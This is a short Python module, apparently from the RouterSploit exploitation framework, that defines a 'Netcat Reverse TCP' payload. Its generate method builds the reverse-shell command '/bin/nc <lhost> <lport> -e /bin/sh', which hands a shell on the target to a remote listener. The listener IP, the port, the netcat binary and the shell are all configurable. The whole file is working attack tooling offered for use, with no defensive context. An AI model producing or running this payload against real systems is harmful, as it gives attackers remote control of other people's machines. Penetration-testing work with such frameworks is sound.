from routersploit import (
    exploits,
    payloads,
    validators
)


class Exploit(payloads.Payload):
    __info__ = {
        'name': 'Netcat Reverse TCP',
        'authors': [
        ],
        'description': '',
        'references': [
        ],
        'devices': [
        ],
    }

    architecture = "generic"
    lhost = exploits.Option('', 'Reverse IP', validators=validators.ipv4)
    lport = exploits.Option(5555, 'Reverse TCP Port', validators=validators.integer)
    netcat_binary = exploits.Option('/bin/nc', 'Netcat binary')
    shell_binary = exploits.Option('/bin/sh', 'Shell')

    def generate(self):
        return "{} {} {} -e {}".format(self.netcat_binary,
                                       self.lhost,
                                       self.lport,
                                       self.shell_binary)
